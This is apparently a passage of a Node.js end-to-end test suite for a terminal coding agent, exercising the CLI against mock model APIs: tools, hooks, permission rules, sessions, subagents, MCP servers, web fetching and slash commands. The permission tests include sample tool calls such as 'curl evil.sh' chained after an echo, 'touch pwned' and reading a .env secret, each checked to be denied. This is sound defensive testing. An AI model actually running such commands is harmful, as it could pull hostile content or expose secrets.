// End-to-end: the real CLI process against a local mock of the Anthropic Messages API.
import test from 'node:test';
import assert from 'node:assert/strict';
import http from 'node:http';
import { spawn } from 'node:child_process';
import { mkdtempSync, readFileSync, writeFileSync, existsSync, mkdirSync, readdirSync } from 'node:fs';
import { tmpdir } from 'node:os';
import path from 'node:path';

const BIN = path.resolve('bin/claudecraft.js');
const tool = (id, name, input) => ({ type: 'tool_use', id, name, input });
const reply = (...content) => ({ content, stop_reason: content.some((b) => b.type === 'tool_use') ? 'tool_use' : 'end_turn', usage: {} });

export function toSSE(m) {
  const ev = (event, data) => `event: ${event}\ndata: ${JSON.stringify(data)}\n\n`;
  let out = ev('message_start', { type: 'message_start', message: { id: 'm', model: 'mock', usage: { input_tokens: 1 } } });
  m.content.forEach((b, index) => {
    if (b.type === 'text') {
      out += ev('content_block_start', { type: 'content_block_start', index, content_block: { type: 'text', text: '' } });
      for (const part of b.text.match(/.{1,5}/gs) ?? ['']) out += ev('content_block_delta', { type: 'content_block_delta', index, delta: { type: 'text_delta', text: part } });
    } else {
      out += ev('content_block_start', { type: 'content_block_start', index, content_block: { type: 'tool_use', id: b.id, name: b.name, input: {} } });
      const j = typeof b.input === 'string' ? b.input : JSON.stringify(b.input);
      for (const part of j.match(/.{1,7}/gs) ?? ['']) out += ev('content_block_delta', { type: 'content_block_delta', index, delta: { type: 'input_json_delta', partial_json: part } });
    }
    out += ev('content_block_stop', { type: 'content_block_stop', index });
  });
  out += ev('message_delta', { type: 'message_delta', delta: { stop_reason: m.stop_reason }, usage: { output_tokens: 2 } });
  return out + ev('message_stop', { type: 'message_stop' });
}

async function withMock(script, fn) {
  const requests = [];
  const server = http.createServer((req, res) => {
    let body = '';
    req.on('data', (c) => { body += c; });
    req.on('end', () => {
      requests.push({ headers: req.headers, body: JSON.parse(body) });
      const r = script[Math.min(requests.length - 1, script.length - 1)];
      if (requests.at(-1).body.stream) { res.writeHead(200, { 'content-type': 'text/event-stream' }); res.end(toSSE(r)); return; }
      res.writeHead(200, { 'content-type': 'application/json' });
      res.end(JSON.stringify(r));
    });
  });
  await new Promise((r) => server.listen(0, '127.0.0.1', r));
  try { return await fn(`http://127.0.0.1:${server.address().port}`, requests); } finally { server.close(); }
}

function runRea(args, { cwd, baseURL, stdin = '' }) {
  return new Promise((resolve) => {
    const p = spawn('node', [BIN, ...args], { cwd, env: { ...process.env, ANTHROPIC_API_KEY: 'test-key', ANTHROPIC_BASE_URL: baseURL, HOME: cwd } });
    let out = '', err = '';
    p.stdout.on('data', (b) => { out += b; }); p.stderr.on('data', (b) => { err += b; });
    p.on('close', (code) => resolve({ code, out, err }));
    p.stdin.end(stdin);
  });
}

const tmp = () => mkdtempSync(path.join(tmpdir(), 'rea-e2e-'));

test('print mode: Write then Read then final answer; API payload is well-formed', async () => {
  const cwd = tmp();
  const script = [
    reply(tool('a', 'Write', { file_path: 'hello.txt', content: 'hi there\n' })),
    reply(tool('b', 'Read', { file_path: 'hello.txt' }), tool('c', 'Glob', { pattern: '*.txt' })),
    reply({ type: 'text', text: 'Created hello.txt.' }),
  ];
  await withMock(script, async (baseURL, requests) => {
    const r = await runRea(['-p', 'make a file', '--permission-mode', 'bypassPermissions'], { cwd, baseURL });
    assert.equal(r.code, 0, r.err);
    assert.equal(readFileSync(path.join(cwd, 'hello.txt'), 'utf8'), 'hi there\n');
    assert.match(r.out, /Created hello\.txt\./);
    assert.equal(requests.length, 3);
    assert.equal(requests[0].headers['x-api-key'], 'test-key');
    assert.equal(requests[0].body.model, 'claude-sonnet-5-5');
    assert.ok(requests[0].body.tools.some((t) => t.name === 'Bash'));
    // tool_result blocks sent back contain only API-legal fields, and preserve order
    const last = requests[2].body.messages.at(-1);
    assert.deepEqual(last.content.map((b) => b.tool_use_id), ['b', 'c']);
    for (const b of last.content) assert.deepEqual(Object.keys(b).filter((k) => !['type', 'tool_use_id', 'content', 'is_error', 'cache_control'].includes(k)), []);
    assert.match(last.content[0].content, /1\thi there/);
  });
});

test('print mode without a terminal denies prompting tools instead of hanging', async () => {
  const cwd = tmp();
  const script = [reply(tool('a', 'Bash', { command: 'touch pwned' })), reply({ type: 'text', text: 'blocked' })];
  await withMock(script, async (baseURL, requests) => {
    const r = await runRea(['-p', 'do it'], { cwd, baseURL });
    assert.equal(existsSync(path.join(cwd, 'pwned')), false);
    const tr = requests[1].body.messages.at(-1).content[0];
    assert.equal(tr.is_error, true);
    assert.match(tr.content, /Permission denied/);
    assert.equal(r.code, 0);
  });
});

test('read-only Bash runs without a prompt; Edit refuses until the file was Read', async () => {
  const cwd = tmp();
  writeFileSync(path.join(cwd, 'a.txt'), 'one two\n');
  const script = [
    reply(tool('1', 'Bash', { command: 'ls' }), tool('2', 'Edit', { file_path: 'a.txt', old_string: 'one', new_string: '1' })),
    reply(tool('3', 'Read', { file_path: 'a.txt' })),
    reply(tool('4', 'Edit', { file_path: 'a.txt', old_string: 'one', new_string: '1' })),
    reply({ type: 'text', text: 'done' }),
  ];
  await withMock(script, async (baseURL, requests) => {
    const r = await runRea(['-p', 'edit', '--permission-mode', 'acceptEdits'], { cwd, baseURL });
    assert.equal(r.code, 0, r.err);
    const first = requests[1].body.messages.at(-1).content;
    assert.match(first[0].content, /a\.txt/);                       // ls output
    assert.match(first[1].content, /has not been read yet/);        // Edit blocked
    assert.equal(readFileSync(path.join(cwd, 'a.txt'), 'utf8'), '1 two\n');
  });
});

test('PreToolUse command hook: exit 2 blocks the tool and its stderr reaches the model', async () => {
  const cwd = tmp();
  mkdirSync(path.join(cwd, '.rea'));
  writeFileSync(path.join(cwd, '.rea/settings.json'), JSON.stringify({
    hooks: { PreToolUse: [{ matcher: 'Bash', command: 'echo "no shell today" >&2; exit 2' }] },
  }));
  const script = [reply(tool('a', 'Bash', { command: 'touch x' })), reply({ type: 'text', text: 'ok' })];
  await withMock(script, async (baseURL, requests) => {
    const r = await runRea(['-p', 'go', '--permission-mode', 'bypassPermissions'], { cwd, baseURL });
    assert.equal(r.code, 0, r.err);
    assert.equal(existsSync(path.join(cwd, 'x')), false);
    assert.match(requests[1].body.messages.at(-1).content[0].content, /no shell today/);
  });
});

test('FileChanged and DirectoryAdded hooks: file watcher sees a Bash-created file, /add-dir fires DirectoryAdded', async () => {
  const cwd = tmp();
  const other = path.join(cwd, '..', `${path.basename(cwd)}-dir2`);
  mkdirSync(other, { recursive: true });
  mkdirSync(path.join(cwd, '.rea'));
  writeFileSync(path.join(cwd, '.rea/settings.json'), JSON.stringify({
    // logs go under .rea/, which the watcher ignores by default - writing them at the top level would make the
    // watcher see its own hook's log write as another FileChanged event, an infinite feedback loop.
    hooks: {
      FileChanged: [{ command: 'cat >> .rea/fc.log' }],
      DirectoryAdded: [{ command: 'cat >> .rea/da.log' }],
    },
  }));
  const script = [reply(tool('a', 'Bash', { command: 'echo hi > watched.txt' })), reply({ type: 'text', text: 'ok' })];
  await withMock(script, async (baseURL) => {
    // runRea() pipes its whole stdin script at once and the OS's file-change notification is not instant (FSEvents
    // latency), so pace the input by hand here instead of racing /exit against the watcher.
    // a separate HOME (not `cwd`) so `~/.rea/settings.json` and `./.rea/settings.json` aren't the same file -
    // loadSettings would otherwise read and merge it twice (once as userSettings, once as projectSettings).
    const home = tmp();
    const r = await new Promise((resolve) => {
      const p = spawn('node', [BIN, '--permission-mode', 'bypassPermissions'], { cwd, env: { ...process.env, ANTHROPIC_API_KEY: 'test-key', ANTHROPIC_BASE_URL: baseURL, HOME: home } });
      let out = '', err = '';
      p.stdout.on('data', (b) => { out += b; }); p.stderr.on('data', (b) => { err += b; });
      p.on('close', (code) => resolve({ code, out, err }));
      p.stdin.write('go\n');
      setTimeout(() => p.stdin.write(`/add-dir ${other}\n/add-dir ${other}\n`), 500);
      setTimeout(() => p.stdin.end('/exit\n'), 1500);
    });
    assert.equal(r.code, 0, r.err);
    const fc = readFileSync(path.join(cwd, '.rea/fc.log'), 'utf8');
    assert.match(fc, /"event":"FileChanged"/);
    assert.match(fc, /"file_path":".*watched\.txt"/);
    assert.match(fc, /"change":"add"/);
    const da = readFileSync(path.join(cwd, '.rea/da.log'), 'utf8');
    assert.match(da, /"event":"DirectoryAdded"/);
    assert.match(da, new RegExp(`"directory":"${other.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}"`));
    assert.match(da, /"source":"slash_command"/);
    assert.equal((da.match(/DirectoryAdded/g) ?? []).length, 1);   // the duplicate /add-dir did not re-fire it
    assert.match(r.out, /is already a workspace directory/);
  });
});

test('interactive session keeps conversation across prompts and exits on /exit', async () => {
  const cwd = tmp();
  const script = [reply({ type: 'text', text: 'first answer' }), reply({ type: 'text', text: 'second answer' })];
  await withMock(script, async (baseURL, requests) => {
    const r = await runRea([], { cwd, baseURL, stdin: 'one\ntwo\n/exit\n' });
    assert.equal(r.code, 0, r.err);
    assert.match(r.out, /first answer/); assert.match(r.out, /second answer/);
    assert.equal(requests[1].body.messages.length, 3); // user, assistant, user
  });
});

test('missing API key and bad flags fail cleanly', async () => {
  const cwd = tmp();
  const run = (args, env) => new Promise((resolve) => {
    const p = spawn('node', [BIN, ...args], { cwd, env: { PATH: process.env.PATH, HOME: cwd, ...env } });
    let err = ''; p.stderr.on('data', (b) => { err += b; });
    p.on('close', (code) => resolve({ code, err }));
  });
  assert.match((await run(['-p', 'x'], {})).err, /ANTHROPIC_API_KEY is not set/);
  const bad = await run(['--permission-mode', 'nope'], { ANTHROPIC_API_KEY: 'k' });
  assert.equal(bad.code, 2);
});

test('interactive /compact summarizes history; /context reports it; /clear resets', async () => {
  const cwd = tmp();
  const script = [
    reply({ type: 'text', text: 'first answer' }),
    reply({ type: 'text', text: 'second answer' }),
    reply({ type: 'text', text: '<analysis>x</analysis><summary>EARLIER WORK</summary>' }),
  ];
  await withMock(script, async (baseURL, requests) => {
    const r = await runRea([], { cwd, baseURL, stdin: `one ${'lorem ipsum dolor sit amet '.repeat(500)}\ntwo\n/compact keep file names\n/context\n/clear\n/context\n/exit\n` });
    assert.equal(r.code, 0, r.err);
    assert.match(r.err, /compacting context \(manual/);
    assert.match(r.err, /compacted ~\d+ -> ~\d+ tokens/);
    assert.match(r.out, /Context: ~\d+ \/ \d+ tokens \(ok, auto-compact at \d+, 1 compactions\)/);
    assert.match(r.out, /Conversation cleared/);
    const req = requests[2].body;                          // the summarization request
    assert.equal(req.tools, undefined);
    assert.match(JSON.stringify(req.messages.at(-1)), /keep file names/);
  });
});

test('sessions: -p run is persisted, --continue sees prior history, --no-persist writes nothing, bad --resume fails', async () => {
  const cwd = tmp();
  const { readdirSync } = await import('node:fs');
  const projDir = () => { try { return readdirSync(path.join(cwd, '.rea', 'projects')).map((d) => path.join(cwd, '.rea', 'projects', d)); } catch { return []; } };
  await withMock([reply({ type: 'text', text: 'ONE' })], async (baseURL) => {
    const r1 = await runRea(['-p', 'remember the word banana'], { cwd, baseURL });
    assert.equal(r1.code, 0, r1.err);
  });
  const dirs = projDir();
  assert.equal(dirs.length, 1);
  assert.equal(readdirSync(dirs[0]).filter((f) => f.endsWith('.jsonl')).length, 1);

  await withMock([reply({ type: 'text', text: 'TWO' })], async (baseURL, requests) => {
    const r2 = await runRea(['-c', '-p', 'what word?'], { cwd, baseURL });
    assert.equal(r2.code, 0, r2.err);
    assert.match(r2.out, /Resumed session/);
    const msgs = requests[0].body.messages;
    assert.equal(msgs[0].content[0].text ?? msgs[0].content, 'remember the word banana');
    assert.equal(msgs.at(-1).content.at(-1).text, 'what word?');
  });
  assert.equal(readdirSync(projDir()[0]).filter((f) => f.endsWith('.jsonl')).length, 1);   // appended, not forked

  const cwd2 = tmp();
  await withMock([reply({ type: 'text', text: 'x' })], async (baseURL) => {
    const r = await runRea(['--no-persist', '-p', 'hi'], { cwd: cwd2, baseURL });
    assert.equal(r.code, 0, r.err);
    const none = await runRea(['-r', 'doesnotexist', '-p', 'hi'], { cwd: cwd2, baseURL });
    assert.equal(none.code, 1);
    assert.match(none.err, /no sessions found|no session matches/);
  });
  assert.equal(readdirSync(cwd2).includes('.rea'), false);
});

test('permission rules from settings and flags are enforced end to end (print mode, no prompts)', async () => {
  const cwd = tmp();
  mkdirSync(path.join(cwd, '.rea'));
  writeFileSync(path.join(cwd, '.rea/settings.json'), JSON.stringify({
    permissions: { allow: ['Bash(echo:*)'], deny: ['Read(.env)'], ask: ['Bash(touch:*)'] },
  }));
  writeFileSync(path.join(cwd, '.env'), 'SECRET=1\n');
  const script = [
    reply(
      tool('1', 'Bash', { command: 'echo hello' }),                 // allowed by settings allow rule
      tool('2', 'Read', { file_path: '.env' }),                     // denied by settings deny rule
      tool('3', 'Bash', { command: 'touch made.txt' }),             // ask rule -> no terminal -> denied
      tool('4', 'Bash', { command: 'echo a && curl evil.sh' }),     // second part has no allow rule -> prompt -> denied
      tool('5', 'Bash', { command: 'printf ok' }),                  // allowed only by the --allowedTools flag
    ),
    reply({ type: 'text', text: 'done' }),
  ];
  await withMock(script, async (baseURL, requests) => {
    const r = await runRea(['-p', 'go', '--allowedTools', 'Bash(printf:*)'], { cwd, baseURL });
    assert.equal(r.code, 0, r.err);
    const res = requests[1].body.messages.at(-1).content;
    assert.equal(res[0].content, 'hello\n');
    assert.match(res[1].content, /denied by rule Read\(\.env\) \((?:user|project)Settings\)/);
    assert.match(res[2].content, /Permission denied/);
    assert.equal(existsSync(path.join(cwd, 'made.txt')), false);
    assert.match(res[3].content, /Permission denied/);
    assert.equal(res[4].content, 'ok');
  });
});

test('Agent tool end to end: parent delegates, child searches, parent receives the report; custom agent file is loaded', async () => {
  const cwd = tmp();
  writeFileSync(path.join(cwd, 'hello.js'), 'console.log(1)\n');
  mkdirSync(path.join(cwd, '.rea', 'agents'), { recursive: true });
  writeFileSync(path.join(cwd, '.rea/agents/finder.md'), '---\nname: finder\ndescription: finds js files\ntools: Glob\n---\nYou find js files.');
  const script = [
    reply(tool('p1', 'Agent', { description: 'find js', prompt: 'List the js files', subagent_type: 'finder' })),   // parent
    reply(tool('c1', 'Glob', { pattern: '*.js' })),                                                                  // child
    reply({ type: 'text', text: 'Found: hello.js' }),                                                                // child final
    reply({ type: 'text', text: 'The repo has hello.js.' }),                                                         // parent final
  ];
  await withMock(script, async (baseURL, requests) => {
    const r = await runRea(['-p', 'what js files exist?', '--permission-mode', 'bypassPermissions'], { cwd, baseURL });
    assert.equal(r.code, 0, r.err);
    assert.match(r.out, /↳ \[finder\] Glob\(/);
    assert.match(r.out, /The repo has hello\.js\./);
    assert.equal(requests.length, 4);
    assert.deepEqual(requests[1].body.tools.map((t) => t.name), ['Glob']);            // child sees only its tools
    assert.match(requests[1].body.system[0].text, /You find js files/);
    assert.ok(requests[0].body.tools.some((t) => t.name === 'Agent' && /finder: finds js files/.test(t.description)));
    const toolResult = requests[3].body.messages.at(-1).content[0];
    assert.match(toolResult.content, /Found: hello\.js/);
    assert.match(toolResult.content, /<usage>subagent_tokens: \d+ tool_uses: 1/);
  });
});

test('memory + skills end to end: REA.md in the request, /skill expands with args, model can call Skill, /memory and /skills list', async () => {
  const cwd = tmp();
  writeFileSync(path.join(cwd, 'REA.md'), '# Rules\nAlways answer in haiku.\n@docs/style.md\n');
  mkdirSync(path.join(cwd, 'docs'));
  writeFileSync(path.join(cwd, 'docs/style.md'), 'Use tabs.');
  mkdirSync(path.join(cwd, '.rea/skills/greet'), { recursive: true });
  writeFileSync(path.join(cwd, '.rea/skills/greet/SKILL.md'), '---\ndescription: greet someone\nargument-hint: <name>\n---\nSay hello to $ARGUMENTS warmly.');

  // 1) interactive: /memory, /skills, unknown command, a user-invoked skill, then /exit
  await withMock([reply({ type: 'text', text: 'hello Ada' })], async (baseURL, requests) => {
    const r = await runRea([], { cwd, baseURL, stdin: '/memory\n/skills\n/nope\n/greet Ada\n/exit\n' });
    assert.equal(r.code, 0, r.err);
    assert.match(r.out, /project\s+.*REA\.md/);
    assert.match(r.out, /import\s+.*style\.md\s+\(imported by REA\.md\)/);
    assert.match(r.out, /\/greet\s+greet someone/);
    assert.match(r.out, /Unknown command \/nope/);
    assert.equal(requests.length, 1);                                         // only /greet reached the model
    const body = requests[0].body;
    assert.equal(body.messages.at(-1).content.at(-1).text, 'Say hello to Ada warmly.');
    const sys = body.system.map((b) => b.text).join('\n');
    assert.match(sys, /Always answer in haiku\./);
    assert.match(sys, /Use tabs\./);
    assert.ok(body.tools.some((t) => t.name === 'Skill' && /- greet: greet someone/.test(t.description)));
  });

  // 2) the model calls the Skill tool itself
  await withMock([
    reply(tool('s1', 'Skill', { skill: 'greet', args: 'Bob' })),
    reply({ type: 'text', text: 'done' }),
  ], async (baseURL, requests) => {
    const r = await runRea(['-p', 'greet Bob'], { cwd, baseURL });
    assert.equal(r.code, 0, r.err);
    assert.match(requests[1].body.messages.at(-1).content[0].content, /Say hello to Bob warmly\./);
  });

  // 3) --no-memory leaves the system prompt clean
  await withMock([reply({ type: 'text', text: 'x' })], async (baseURL, requests) => {
    await runRea(['--no-memory', '-p', 'hi'], { cwd, baseURL });
    assert.doesNotMatch(requests[0].body.system.map((b) => b.text).join('\n'), /haiku/);
  });

  // 4) print-mode slash command
  await withMock([reply({ type: 'text', text: 'ok' })], async (baseURL, requests) => {
    const r = await runRea(['-p', '/greet Cleo'], { cwd, baseURL });
    assert.equal(r.code, 0, r.err);
    assert.equal(requests[0].body.messages.at(-1).content.at(-1).text, 'Say hello to Cleo warmly.');
  });
});

test('MCP end to end: --mcp-config tools are offered and callable; project .mcp.json needs approval; /mcp lists servers', async () => {
  const cwd = tmp();
  const server = { command: process.execPath, args: [path.resolve('test/fixtures/mock-mcp-server.mjs')] };
  writeFileSync(path.join(cwd, 'mcp.json'), JSON.stringify({ mcpServers: { mock: server } }));

  // 1) trusted explicit config; allow rule lets print mode call the tool without a prompt
  await withMock([
    reply(tool('m1', 'mcp__mock__echo', { text: 'hi' }), tool('m2', 'mcp__mock__boom', {}), tool('m3', 'ReadMcpResource', { server: 'mock', uri: 'mock://readme' })),
    reply({ type: 'text', text: 'done' }),
  ], async (baseURL, requests) => {
    const r = await runRea(['--mcp-config', 'mcp.json', '--allowedTools', 'mcp__mock', '-p', 'use mcp'], { cwd, baseURL });
    assert.equal(r.code, 0, r.err);
    const names = requests[0].body.tools.map((t) => t.name);
    assert.ok(names.includes('mcp__mock__echo') && names.includes('ListMcpResources'));
    assert.ok(!names.includes('mcp__mock__evil'));                                   // screened out
    const res = requests[1].body.messages.at(-1).content;
    assert.equal(res[0].content, 'echo: hi');
    assert.equal(res[1].is_error, true);
    assert.match(res[1].content, /it broke/);
    assert.equal(res[2].content, 'README CONTENT');
  });

  // 2) project .mcp.json is NOT started without approval (print mode cannot ask)
  const proj = tmp();
  writeFileSync(path.join(proj, '.mcp.json'), JSON.stringify({ mcpServers: { projsrv: server } }));
  await withMock([reply({ type: 'text', text: 'ok' })], async (baseURL, requests) => {
    const r = await runRea(['-p', 'hi'], { cwd: proj, baseURL });
    assert.equal(r.code, 0, r.err);
    assert.match(r.err, /MCP server "projsrv" from \.mcp\.json is not approved/);
    assert.ok(!requests[0].body.tools.some((t) => t.name.startsWith('mcp__')));
  });
  // ... and starts once approved in settings.local.json
  mkdirSync(path.join(proj, '.rea'), { recursive: true });
  writeFileSync(path.join(proj, '.rea/settings.local.json'), JSON.stringify({ enabledMcpjsonServers: ['projsrv'] }));
  await withMock([reply({ type: 'text', text: 'ok' })], async (baseURL, requests) => {
    const r = await runRea(['-p', 'hi'], { cwd: proj, baseURL });
    assert.equal(r.code, 0, r.err);
    assert.ok(requests[0].body.tools.some((t) => t.name === 'mcp__projsrv__echo'));
  });

  // 3) /mcp in the REPL, and --no-mcp
  await withMock([reply({ type: 'text', text: 'x' })], async (baseURL) => {
    const r = await runRea(['--mcp-config', 'mcp.json'], { cwd, baseURL, stdin: '/mcp\n/exit\n' });
    assert.match(r.out, /mock\s+connected\s+stdio\s+5 tools, 1 resources/);
    const none = await runRea(['--no-mcp', '--mcp-config', 'mcp.json'], { cwd, baseURL, stdin: '/mcp\n/exit\n' });
    assert.match(none.out, /no MCP servers/);
  });
});

test('MCP elicitation: Elicitation hook auto-accepts, ElicitationResult hook observes; no hook falls back to decline (no tty)', async () => {
  const cwd = tmp();
  const server = { command: process.execPath, args: [path.resolve('test/fixtures/mock-mcp-server.mjs')] };
  writeFileSync(path.join(cwd, 'mcp.json'), JSON.stringify({ mcpServers: { mock: server } }));

  // 1) an Elicitation hook auto-accepts; the ElicitationResult hook observes the final decision
  mkdirSync(path.join(cwd, '.rea'));
  writeFileSync(path.join(cwd, '.rea/settings.json'), JSON.stringify({
    hooks: {
      Elicitation: [{ command: 'echo \'{"permission":"allow","updatedInput":{"answer":"auto"}}\'' }],
      ElicitationResult: [{ command: 'cat >> .rea/er.log' }],
    },
  }));
  await withMock([reply(tool('m1', 'mcp__mock__ask_user', { message: 'Need input' })), reply({ type: 'text', text: 'done' })], async (baseURL, requests) => {
    const r = await runRea(['--mcp-config', 'mcp.json', '--allowedTools', 'mcp__mock', '-p', 'use mcp'], { cwd, baseURL });
    assert.equal(r.code, 0, r.err);
    const res = requests[1].body.messages.at(-1).content[0].content;
    assert.deepEqual(JSON.parse(res), { action: 'accept', content: { answer: 'auto' } });
    const er = readFileSync(path.join(cwd, '.rea/er.log'), 'utf8');
    assert.match(er, /"event":"ElicitationResult"/);
    assert.match(er, /"mcp_server_name":"mock"/);
    assert.match(er, /"action":"accept"/);
    assert.match(er, /"content":\{"answer":"auto"\}/);
  });

  // 2) no hooks configured, and -p has no tty to prompt on: decline rather than hang
  const cwd2 = tmp();
  writeFileSync(path.join(cwd2, 'mcp.json'), JSON.stringify({ mcpServers: { mock: server } }));
  await withMock([reply(tool('m1', 'mcp__mock__ask_user', {})), reply({ type: 'text', text: 'ok' })], async (baseURL, requests) => {
    const r = await runRea(['--mcp-config', 'mcp.json', '--allowedTools', 'mcp__mock', '-p', 'use mcp'], { cwd: cwd2, baseURL });
    assert.equal(r.code, 0, r.err);
    assert.deepEqual(JSON.parse(requests[1].body.messages.at(-1).content[0].content), { action: 'decline' });
  });
});

test('--provider openai: full loop against an OpenAI-compatible server (streaming tool calls, tool results as tool messages)', async () => {
  const cwd = tmp();
  writeFileSync(path.join(cwd, 'a.txt'), 'one\nTODO two\n');
  const requests = [];
  const sse = (parts) => `${parts.map((p) => `data: ${JSON.stringify(p)}\n\n`).join('')}data: [DONE]\n\n`;
  const script = [
    sse([
      { choices: [{ delta: { tool_calls: [{ index: 0, id: 'call_a', function: { name: 'Grep', arguments: '{"pattern":"TO' } }] } }] },
      { choices: [{ delta: { tool_calls: [{ index: 0, function: { arguments: 'DO","output_mode":"content"}' } }] } }] },
      { choices: [{ delta: {}, finish_reason: 'tool_calls' }] },
      { choices: [], usage: { prompt_tokens: 10, completion_tokens: 5 } },
    ]),
    sse([
      { choices: [{ delta: { content: 'TODO is in ' } }] }, { choices: [{ delta: { content: 'a.txt' }, finish_reason: 'stop' }] },
      { choices: [], usage: { prompt_tokens: 20, completion_tokens: 6 } },
    ]),
  ];
  const server = http.createServer((req, res) => {
    let body = ''; req.on('data', (c) => { body += c; });
    req.on('end', () => {
      requests.push({ url: req.url, auth: req.headers.authorization, body: JSON.parse(body) });
      res.writeHead(200, { 'content-type': 'text/event-stream' });
      res.end(script[Math.min(requests.length - 1, script.length - 1)]);
    });
  });
  await new Promise((r) => server.listen(0, '127.0.0.1', r));
  try {
    const base = `http://127.0.0.1:${server.address().port}/v1`;
    const r = await new Promise((resolve) => {
      const p = spawn('node', [BIN, '--provider', 'openai', '--base-url', base, '--model', 'gpt-test', '--no-persist', '-p', 'where is TODO?'],
        { cwd, env: { PATH: process.env.PATH, HOME: cwd, OPENAI_API_KEY: 'sk-test' } });
      let out = '', err = '';
      p.stdout.on('data', (b) => { out += b; }); p.stderr.on('data', (b) => { err += b; });
      p.on('close', (code) => resolve({ code, out, err }));
      p.stdin.end();
    });
    assert.equal(r.code, 0, r.err);
    assert.match(r.out, /TODO is in a\.txt/);
    assert.equal(requests[0].url, '/v1/chat/completions');
    assert.equal(requests[0].auth, 'Bearer sk-test');
    assert.equal(requests[0].body.model, 'gpt-test');
    assert.equal(requests[0].body.messages[0].role, 'system');
    assert.ok(requests[0].body.tools.some((t) => t.type === 'function' && t.function.name === 'Grep'));
    const toolMsg = requests[1].body.messages.find((m) => m.role === 'tool');
    assert.equal(toolMsg.tool_call_id, 'call_a');
    assert.match(toolMsg.content, /a\.txt:2:TODO two/);
    const asst = requests[1].body.messages.find((m) => m.role === 'assistant');
    assert.equal(asst.tool_calls[0].function.name, 'Grep');
  } finally { server.close(); }
});

test('WebFetch and WebSearch end to end (local servers): private-address guard, extraction step, search results', async () => {
  const cwd = tmp();
  const web = http.createServer((req, res) => {
    if (req.url.startsWith('/search')) { res.writeHead(200, { 'content-type': 'application/json' }); return res.end(JSON.stringify({ results: [{ title: 'Doc One', url: 'https://one.example/d', content: 'first result' }] })); }
    res.writeHead(200, { 'content-type': 'text/html' });
    res.end('<html><title>Spec</title><body><h1>Limits</h1><p>The maximum is 4096 items.</p></body></html>');
  });
  await new Promise((r) => web.listen(0, '127.0.0.1', r));
  const base = `http://127.0.0.1:${web.address().port}`;
  const runWith = (extraEnv, args, baseURL) => new Promise((resolve) => {
    const p = spawn('node', [BIN, ...args], { cwd, env: { PATH: process.env.PATH, HOME: cwd, ANTHROPIC_API_KEY: 'k', ANTHROPIC_BASE_URL: baseURL, ...extraEnv } });
    let out = '', err = '';
    p.stdout.on('data', (b) => { out += b; }); p.stderr.on('data', (b) => { err += b; });
    p.on('close', (code) => resolve({ code, out, err })); p.stdin.end();
  });
  try {
    // 1) private address is refused by default
    await withMock([reply(tool('f', 'WebFetch', { url: `${base}/page`, prompt: 'max?' })), reply({ type: 'text', text: 'blocked' })], async (baseURL, requests) => {
      const r = await runWith({}, ['--allowedTools', 'WebFetch', '--no-persist', '-p', 'fetch'], baseURL);
      assert.equal(r.code, 0, r.err);
      assert.match(requests[1].body.messages.at(-1).content[0].content, /Refusing to fetch a local or private address/);
    });
    // 2) opt-in: fetch, extraction call (no tools), answer returned to the parent
    await withMock([
      reply(tool('f', 'WebFetch', { url: `${base}/page`, prompt: 'what is the maximum?' })),
      reply({ type: 'text', text: 'The maximum is 4096 items.' }),            // extraction step
      reply({ type: 'text', text: 'Max is 4096.' }),                          // parent final
    ], async (baseURL, requests) => {
      const r = await runWith({ REA_WEBFETCH_ALLOW_PRIVATE: '1' }, ['--allowedTools', 'WebFetch', '--no-persist', '-p', 'fetch'], baseURL);
      assert.equal(r.code, 0, r.err);
      assert.equal(requests.length, 3);
      assert.equal(requests[1].body.tools, undefined);
      assert.match(requests[1].body.messages[0].content[0].text, /<page url="http:\/\/127\.0\.0\.1:\d+\/page">[\s\S]*maximum is 4096 items/);
      assert.match(requests[2].body.messages.at(-1).content[0].content, /The maximum is 4096 items\.[\s\S]*source: /);
      assert.match(r.out, /Max is 4096\./);
    });
    // 3) WebSearch registers only when a provider is configured
    await withMock([reply(tool('s', 'WebSearch', { query: 'rea agent' })), reply({ type: 'text', text: 'done' })], async (baseURL, requests) => {
      const none = await runWith({}, ['--no-persist', '-p', 'x'], baseURL);
      assert.ok(!requests[0].body.tools.some((t) => t.name === 'WebSearch'));
      requests.length = 0;
      const r = await runWith({ SEARXNG_URL: base }, ['--allowedTools', 'WebSearch', '--no-persist', '-p', 'search'], baseURL);
      assert.equal(r.code, 0, r.err);
      assert.ok(requests[0].body.tools.some((t) => t.name === 'WebSearch'));
      assert.match(requests[1].body.messages.at(-1).content[0].content, /1\. Doc One\n\s+https:\/\/one\.example\/d\n\s+first result/);
      assert.equal(none.code, 0);
    });
  } finally { web.close(); }
});

test('slash commands: /help /status /usage /model /export /diff, and tasks persist across --continue', async () => {
  const cwd = tmp();
  // run 1: model creates tasks
  await withMock([
    reply(tool('t1', 'TaskCreate', { subject: 'write parser' }), tool('t2', 'TaskCreate', { subject: 'write tests' })),
    reply(tool('t3', 'TaskUpdate', { id: '1', status: 'completed' })),
    reply({ type: 'text', text: 'planned' }),
  ], async (baseURL) => {
    const r = await runRea(['-p', 'plan the work'], { cwd, baseURL });
    assert.equal(r.code, 0, r.err);
  });
  // run 2: resume and use the REPL commands
  await withMock([reply({ type: 'text', text: 'hello back' })], async (baseURL, requests) => {
    const stdin = '/tasks\n/model custom-model-1\n/model\nhi\n/usage\n/status\n/help\n/export out.md\n/diff\n/exit\n';
    const r = await runRea(['-c'], { cwd, baseURL, stdin });
    assert.equal(r.code, 0, r.err);
    assert.match(r.out, /☒ #1 \[completed\] write parser/);
    assert.match(r.out, /☐ #2 \[pending\] write tests/);
    assert.match(r.out, /Model set to custom-model-1/);
    assert.match(r.out, /Model: custom-model-1 \(anthropic\)/);
    assert.equal(requests[0].body.model, 'custom-model-1');
    assert.match(r.out, /requests 1\b.*input 1\b/);
    assert.match(r.out, /provider\s+anthropic[\s\S]*model\s+custom-model-1[\s\S]*tasks\s+2/);
    assert.match(r.out, /\/export \[file\]\s+write the conversation as Markdown/);
    assert.match(r.out, /Exported \d+ messages to out\.md/);
    const md = readFileSync(path.join(cwd, 'out.md'), 'utf8');
    assert.match(md, /## User\n\nplan the work/);
    assert.match(md, /\*\*Tool call:\*\* `TaskCreate`/);
    assert.match(r.out, /Not a git repository|No uncommitted changes|git is not available/);
  });
});

test('slash commands: /cd /add-dir /rename /session /config', async () => {
  const cwd = tmp();
  const sub = path.join(cwd, 'sub'); mkdirSync(sub);
  const other = path.join(cwd, '..', path.basename(cwd) + '-other');
  mkdirSync(other, { recursive: true });
  await withMock([reply({ type: 'text', text: 'hi' })], async (baseURL) => {
